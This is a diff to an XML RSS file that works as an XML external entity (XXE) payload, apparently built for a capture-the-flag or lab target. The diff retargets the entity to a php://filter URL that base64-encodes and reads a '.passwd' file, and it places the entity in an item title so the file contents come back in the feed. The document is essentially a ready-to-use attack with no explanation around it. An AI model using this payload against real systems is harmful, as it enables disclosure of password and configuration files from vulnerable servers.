@@ -1,35 +1,20 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
     <!ELEMENT title ANY>
-    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
-}>
+    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd" >
+]>
 <rss version="1.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <School>
-        <Student>
-            <ID>001</ID>
-            <Name>bibarsest</Name>
-            <Age>20</Age>
-            <Major>Cybersecurity Specialist</Major>
-            <Courses>
-                <Course>
-                    <CourseID>CS101</CourseID>
-                    <CourseName>Introduction to Programming</CourseName>
-                    <Credits>3</Credits>
-                    <Grade>A</Grade>
-                </Course>
-                <Course>
-                    <CourseID>MATH101</CourseID>
-                    <CourseName>Calculus I</CourseName>
-                    <Credits>4</Credits>
-                    <Grade>B+</Grade>
-                </Course>
-                <Course>
-                    <CourseID>ENG101</CourseID>
-                    <CourseName>English Composition</CourseName>
-                    <Credits>3</Credits>
-                    <Grade>A-</Grade>
-                </Course>
-            </Courses>
-        </Student>
-    </School>
+    <channel>
+        <title>The Blog</title>
+        <link>http://example.com/</link>
+        <description>A blog about things</description>
+        <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+        <item>
+            <title>&xxe;</title>
+            <link>http://example.com</link>
+            <description>a post</description>
+            <author>author@example.com</author>
+            <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
+        </item>
+    </channel>
 </rss>
